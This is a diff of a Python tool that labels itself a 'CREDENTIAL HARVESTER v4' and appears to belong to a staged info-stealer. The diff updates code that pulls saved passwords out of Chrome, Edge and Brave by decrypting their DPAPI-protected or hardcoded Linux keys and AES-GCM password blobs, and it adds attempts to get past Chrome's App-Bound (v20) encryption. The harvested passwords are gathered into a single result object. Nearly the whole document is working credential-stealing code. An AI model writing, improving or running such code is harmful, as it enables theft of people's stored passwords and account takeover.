@@ -627,14 +627,15 @@ def get_proxy_settings():
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# PHASE 5: CREDENTIAL HARVESTER v3 — Browser saved passwords extraction
-# Supports: Chrome, Firefox (NSS), Edge, Brave
-# Decryption: DPAPI (win32crypt + ctypes fallback), AES-256-GCM (pycryptodome + cryptography fallback)
-# v3 fixes: scan ALL profiles, include empty-username entries, DPAPI via ctypes, better error info
+# PHASE 5: CREDENTIAL HARVESTER v4 — Browser saved passwords extraction
+# Supports: Chrome (v10/v11/v20), Firefox (NSS), Edge, Brave
+# Decryption: DPAPI (win32crypt + ctypes), AES-256-GCM (pycryptodome + cryptography)
+# v4 fixes: Chrome v20/App-Bound Encryption, scan ALL profiles, diagnostic output
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# Chrome encryption key cache (avoid re-reading Local State for every password)
+# Key cache + diagnostic info
 _chrome_key_cache = {}
+_chrome_diag = {}  # Store diagnostic info per browser
 
 def _dpapi_decrypt_ctypes(data):
     """Decrypt data using Windows DPAPI via ctypes (no pywin32 needed)."""
@@ -667,9 +668,11 @@ def _dpapi_decrypt_ctypes(data):
 
 def _get_chrome_encryption_key(browser_type="chrome"):
     """Get and cache the Chrome/Edge/Brave AES encryption key from Local State.
-    Supports DPAPI via win32crypt OR ctypes fallback."""
+    v4: handles app_bound_encrypted_key (Chrome 127+), DPAPI via win32crypt OR ctypes."""
     if browser_type in _chrome_key_cache:
         return _chrome_key_cache[browser_type]
+    
+    diag = {"browser": browser_type, "local_state_found": False, "key_extracted": False}
     
     try:
         if IS_WINDOWS:
@@ -690,6 +693,7 @@ def _get_chrome_encryption_key(browser_type="chrome"):
                 )
             else:
                 _chrome_key_cache[browser_type] = None
+                _chrome_diag[browser_type] = {**diag, "error": "unknown browser"}
                 return None
         else:
             if browser_type == "chrome":
@@ -700,48 +704,137 @@ def _get_chrome_encryption_key(browser_type="chrome"):
                 local_state_path = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Local State')
             else:
                 _chrome_key_cache[browser_type] = None
+                _chrome_diag[browser_type] = {**diag, "error": "unknown browser"}
                 return None
 
         if not os.path.exists(local_state_path):
             _chrome_key_cache[browser_type] = None
+            _chrome_diag[browser_type] = {**diag, "error": "Local State not found"}
             return None
+
+        diag["local_state_found"] = True
 
         with open(local_state_path, 'r', encoding='utf-8') as f:
             local_state = json.load(f)
 
-        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-
-        if IS_WINDOWS:
-            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
-            # Try win32crypt first, then ctypes DPAPI fallback
-            key = None
+        os_crypt = local_state.get('os_crypt', {})
+        
+        # Check Chrome version for App-Bound Encryption detection
+        browser_version = None
+        if browser_type == "chrome":
+            # Try to get Chrome version from Local State
+            browser_version = local_state.get('browser', {}).get('version', '')
+        elif browser_type == "edge":
+            browser_version = local_state.get('browser', {}).get('version', '')
+        
+        if browser_version:
+            diag["browser_version"] = browser_version
+        
+        # Check for App-Bound Encryption (Chrome 127+)
+        app_bound_key_b64 = os_crypt.get('app_bound_encrypted_key', '')
+        has_app_bound = bool(app_bound_key_b64)
+        diag["has_app_bound_encryption"] = has_app_bound
+        
+        if has_app_bound:
+            diag["app_bound_key_version"] = os_crypt.get('app_bound_key_version', 'unknown')
+        
+        # --- Strategy 1: Standard encrypted_key (works for v10/v11 passwords) ---
+        encrypted_key_b64 = os_crypt.get('encrypted_key', '')
+        key = None
+        
+        if encrypted_key_b64:
             try:
-                import win32crypt
-                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-            except ImportError:
-                pass
-            if key is None:
-                key = _dpapi_decrypt_ctypes(encrypted_key)
-            if key is None:
-                _chrome_key_cache[browser_type] = None
-                return None
+                encrypted_key = base64.b64decode(encrypted_key_b64)
+                diag["encrypted_key_prefix"] = encrypted_key[:5].decode('ascii', errors='replace')
+                
+                if IS_WINDOWS:
+                    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+                    
+                    # Try win32crypt first
+                    dpapi_method = "none"
+                    try:
+                        import win32crypt
+                        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                        dpapi_method = "win32crypt"
+                    except ImportError:
+                        pass
+                    except Exception as e:
+                        diag["win32crypt_error"] = str(e)[:100]
+                    
+                    # Fallback: ctypes DPAPI
+                    if key is None:
+                        key = _dpapi_decrypt_ctypes(encrypted_key)
+                        if key:
+                            dpapi_method = "ctypes_dpapi"
+                    
+                    diag["dpapi_method"] = dpapi_method
+                else:
+                    # Linux: PBKDF2 with 'peanuts' password
+                    try:
+                        from Crypto.Cipher import AES
+                        from Crypto.Protocol.KDF import PBKDF2
+                        from Crypto.Hash import SHA1, HMAC
+                        salt = b'saltysalt'
+                        key = PBKDF2(b'peanuts', salt, dkLen=16, count=1,
+                                    prf=lambda p, s: HMAC.new(p, s, SHA1).digest())
+                        diag["dpapi_method"] = "linux_pbkdf2"
+                    except ImportError:
+                        diag["dpapi_method"] = "none"
+            except Exception as e:
+                diag["encrypted_key_error"] = str(e)[:100]
+        
+        # --- Strategy 2: App-Bound encrypted_key (Chrome 127+ / v20 passwords) ---
+        app_bound_key = None
+        if has_app_bound and key is None and IS_WINDOWS:
+            # App-Bound key is encrypted by Chrome elevation service
+            # Try DPAPI anyway (sometimes it works for the wrapper)
+            try:
+                app_bound_raw = base64.b64decode(app_bound_key_b64)
+                diag["app_bound_key_prefix"] = app_bound_raw[:4].decode('ascii', errors='replace')
+                
+                # Strip the 'APPB' prefix if present
+                if app_bound_raw[:4] == b'APPB':
+                    app_bound_raw = app_bound_raw[4:]
+                
+                # Try DPAPI decryption (rarely works, but worth trying)
+                try:
+                    import win32crypt
+                    app_bound_key = win32crypt.CryptUnprotectData(app_bound_raw, None, None, None, 0)[1]
+                    diag["app_bound_dpapi"] = "win32crypt_success"
+                except ImportError:
+                    pass
+                except Exception:
+                    pass
+                
+                if app_bound_key is None:
+                    app_bound_key = _dpapi_decrypt_ctypes(app_bound_raw)
+                    if app_bound_key:
+                        diag["app_bound_dpapi"] = "ctypes_success"
+            except Exception as e:
+                diag["app_bound_decode_error"] = str(e)[:100]
+        
+        # Use the best key we found
+        final_key = key or app_bound_key
+        if final_key:
+            _chrome_key_cache[browser_type] = final_key
+            diag["key_extracted"] = True
+            diag["key_length"] = len(final_key)
+            _chrome_diag[browser_type] = diag
+            return final_key
         else:
-            # Linux: Chrome v80+ uses key from Local State with PBKDF2
-            try:
-                from Crypto.Cipher import AES
-                from Crypto.Protocol.KDF import PBKDF2
-                from Crypto.Hash import SHA1, HMAC
-                salt = b'saltysalt'
-                key = PBKDF2(b'peanuts', salt, dkLen=16, count=1,
-                            prf=lambda p, s: HMAC.new(p, s, SHA1).digest())
-            except ImportError:
-                _chrome_key_cache[browser_type] = None
-                return None
+            _chrome_key_cache[browser_type] = None
+            diag["key_extracted"] = False
+            if has_app_bound:
+                diag["error"] = "App-Bound Encryption active (Chrome 127+). Requires IElevator service (admin)."
+            else:
+                diag["error"] = "DPAPI decryption failed for encrypted_key"
+            _chrome_diag[browser_type] = diag
+            return None
 
-        _chrome_key_cache[browser_type] = key
-        return key
-    except Exception:
+    except Exception as e:
         _chrome_key_cache[browser_type] = None
+        diag["error"] = f"Exception: {str(e)[:100]}"
+        _chrome_diag[browser_type] = diag
         return None
 
 
@@ -771,15 +864,21 @@ def _aes_gcm_decrypt(key, nonce, ciphertext, tag):
 
 
 def _decrypt_chromium_password(encrypted_password, browser_type="chrome"):
-    """Decrypt Chrome/Edge/Brave password using DPAPI or AES-256-GCM (v80+).
-    Supports multiple decryption backends for maximum compatibility."""
+    """Decrypt Chrome/Edge/Brave password using DPAPI or AES-256-GCM.
+    v4: supports v10/v11/v20 prefixes, multiple decryption backends."""
     try:
         if not encrypted_password:
             return "(empty)"
 
+        # Detect encryption version
+        enc_prefix = ""
+        if len(encrypted_password) >= 3:
+            enc_prefix = encrypted_password[:3].decode('ascii', errors='replace')
+
         if IS_WINDOWS:
-            # Chrome v80+ uses AES-256-GCM with prefix 'v10' or 'v11'
-            if encrypted_password[:3] in (b'v10', b'v11'):
+            # Chrome v10/v11: AES-256-GCM with DPAPI-protected key
+            # Chrome v20: AES-256-GCM with App-Bound key (Chrome 127+)
+            if enc_prefix in ('v10', 'v11', 'v20'):
                 key = _get_chrome_encryption_key(browser_type)
                 if key:
                     nonce = encrypted_password[3:15]
@@ -789,8 +888,15 @@ def _decrypt_chromium_password(encrypted_password, browser_type="chrome"):
                     result = _aes_gcm_decrypt(key, nonce, ciphertext, tag)
                     if result is not None:
                         return result.decode('utf-8', errors='replace')
+                
+                # If key extraction failed and it's v20, report App-Bound Encryption
+                if enc_prefix == 'v20':
+                    diag = _chrome_diag.get(browser_type, {})
+                    if diag.get("has_app_bound_encryption"):
+                        return "[APP_BOUND_ENCRYPTED-v20]"
+                    return "[v20_DECRYPT_FAILED]"
 
-            # Fallback: Try DPAPI via win32crypt
+            # Fallback: Try DPAPI via win32crypt (older Chrome versions, unencrypted passwords)
             try:
                 import win32crypt
                 return win32crypt.CryptUnprotectData(
@@ -806,11 +912,13 @@ def _decrypt_chromium_password(encrypted_password, browser_type="chrome"):
             if result:
                 return result.decode('utf-8', errors='replace')
 
+            if enc_prefix in ('v10', 'v11'):
+                return f"[{enc_prefix}_DECRYPT_FAILED]"
             return "[DECRYPT_FAILED]"
 
         else:
-            # Linux: PBKDF2 with 'peanuts' password
-            if encrypted_password[:3] in (b'v10', b'v11'):
+            # Linux: AES-256-GCM for v10/v11/v20
+            if enc_prefix in ('v10', 'v11', 'v20'):
                 key = _get_chrome_encryption_key(browser_type)
                 if key:
                     nonce = encrypted_password[3:15]
@@ -1297,14 +1405,16 @@ def harvest_brave_passwords():
 
 
 def harvest_all_credentials():
-    """[CRED-5] Master function: Harvest credentials from all browsers."""
+    """[CRED-5] Master function: Harvest credentials from all browsers.
+    v4: includes diagnostic info for Chrome decryption troubleshooting."""
     all_creds = {
         "chrome_passwords": [],
         "chrome_cookies_count": 0,
         "firefox_passwords": [],
         "edge_passwords": [],
         "brave_passwords": [],
-        "summary": {}
+        "summary": {},
+        "decryption_diagnostics": {}
     }
 
     # Chrome passwords
@@ -1312,6 +1422,15 @@ def harvest_all_credentials():
         chrome_pw = harvest_chrome_passwords()
         all_creds["chrome_passwords"] = chrome_pw[:100]
         all_creds["summary"]["chrome_passwords"] = len(chrome_pw)
+        # Count encryption types
+        v10_count = sum(1 for p in chrome_pw if 'v10' in p.get('password', ''))
+        v11_count = sum(1 for p in chrome_pw if 'v11' in p.get('password', ''))
+        v20_count = sum(1 for p in chrome_pw if 'v20' in p.get('password', '') or 'APP_BOUND' in p.get('password', ''))
+        decrypt_ok = sum(1 for p in chrome_pw if not p.get('password', '').startswith('['))
+        all_creds["summary"]["chrome_decrypted"] = decrypt_ok
+        all_creds["summary"]["chrome_v10_encrypted"] = v10_count
+        all_creds["summary"]["chrome_v11_encrypted"] = v11_count
+        all_creds["summary"]["chrome_v20_encrypted"] = v20_count
     except Exception as e:
         all_creds["summary"]["chrome_error"] = str(e)
 
@@ -1351,6 +1470,9 @@ def harvest_all_credentials():
         all_creds["summary"]["brave_passwords"] = len(brave_pw)
     except Exception as e:
         all_creds["summary"]["brave_error"] = str(e)
+
+    # Include decryption diagnostics
+    all_creds["decryption_diagnostics"] = dict(_chrome_diag)
 
     return all_creds
 
